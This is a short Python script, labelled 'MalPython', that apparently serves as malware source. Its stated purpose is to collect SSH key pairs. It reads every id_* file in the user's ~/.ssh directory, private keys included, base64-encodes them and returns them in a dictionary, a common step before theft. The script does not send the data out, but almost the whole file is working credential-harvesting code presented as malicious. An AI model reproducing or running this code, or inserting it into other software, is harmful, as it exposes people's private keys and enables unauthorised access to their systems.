# MalPython
#
# Collect all SSH key pairs.

import os
import glob 
import base64 

def read_ssh_dir():
    # retrieve all the entries in the ~/.ssh directory
    ssh_dir = os.path.expanduser("~/.ssh")
    keys = glob.glob(os.path.join(ssh_dir, "id_*"))
    result = {}

    # read the file and map it
    for key in keys:
        with open(key, "rb") as f:
            data = f.read()
            encoded = base64.b64encode(data).decode()
            result[key] = encoded
    
    return result